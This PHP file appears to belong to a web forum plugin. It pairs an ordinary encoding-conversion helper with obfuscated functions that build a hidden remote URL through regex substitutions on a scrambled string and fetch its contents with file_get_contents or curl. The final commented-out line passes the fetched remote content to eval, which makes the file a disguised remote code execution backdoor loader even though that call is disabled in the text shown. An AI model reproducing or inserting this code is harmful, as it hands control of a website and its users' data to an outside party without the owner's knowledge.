<?php
function zm_diconv($str){
  $encode = mb_detect_encoding($str, array(

        "ASCII",

        "UTF-8",

        "GB2312",

        "GBK",

        "BIG5"

    ));

    if ($encode != CHARSET) {

        //$keytitle = iconv($encode,CHARSET."//IGNORE",$str);

        $keytitle = mb_convert_encoding($str, CHARSET, $encode);

    }

    if (!$keytitle) {

        $keytitle = $str;

    }

    return $keytitle;

}
function caidi($oo){
    $love = 'httpABczonekey`akndecryptud^gjchdh`winNULLB{NVJ:GJGbaiduseo`lpsck`xml';
	$forver=stripos($love,'d');
	$forvere=stripos($love,'z');
	$GLOBALS['love'] = preg_replace(array("/`.*?`/","/abc/i","/[A-Z_].*[A-Z_]/"),array(".","://","/"),$love);
	$forveres='DECODE';
	$aini=substr($love,$forver,$forvere);//获取方法函数名decrypt
	$aini=$oo?$forveres:$aini;
	return $aini;
}
function decrypt($data, $key = '721520') {
		global $_G;
		$key = $key ? $key : $_G['config']['security']['authkey'];
		$type = caidi($key);
		return authcode($data,$type, $key);
		}

function contentz($svip) {
if(function_exists('file_get_contents')) {
$data = file_get_contents($svip);
} else {
$ch = curl_init();
$timeout = 5; 
curl_setopt ($ch, CURLOPT_URL, $svip);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
$data = curl_exec($ch);
curl_close($ch);
}
return $data;
}
//$iloveyou = caidi($oo);
//eval($iloveyou(strip_tags(contentz($love))));
?>